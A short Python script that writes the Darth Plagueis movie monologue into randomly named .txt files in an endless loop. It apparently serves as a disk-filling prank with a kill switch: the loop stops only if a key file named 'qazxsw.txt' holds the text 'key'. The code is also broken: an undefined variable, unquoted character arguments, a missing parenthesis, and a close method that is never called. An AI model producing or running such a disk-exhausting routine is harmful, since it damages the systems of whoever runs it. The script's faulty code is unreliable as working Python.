#!/usr/bin/python
import random, os
pl = "Did you ever hear the tragedy of Darth Plagueis the Wise?\nI thought not. It's not a story the Jedi would tell you. It's a Sith legend. Darth Plagueis was a Dark Lord of the Sith, so powerful and so wise he could use the Force to influence the midichlorians to create life... He had such a knowledge of the dark side that he could even keep the ones he cared about from dying. The dark side of the Force is a pathway to many abilities some consider to be unnatural. He became so powerful... the only thing he was afraid of was losing his power, which eventually, of course, he did. Unfortunately, he taught his apprentice everything he knew, then his apprentice killed him in his sleep. It's ironic he could save others from death, but not himself."

def name():
	url = ""
	for x in range(0,random.randint(5,12)):
		out += chr(random.randint(ord(a),ord(z))
	return url + ".txt"

def testsafe():
	try:
		key = open("qazxsw.txt","r")
	except:
		return False

	if key.read() == "key":
		return True
	else:
		return False

safe = testsafe()
if safe == True:
	os.system("mkdir dump")
	os.system("cd dump")

print(name())
while True:
	file = open(name(),"w")
	file.write(pl)
	file.close

	if safe == True:
		break
	else:
		pass #change dir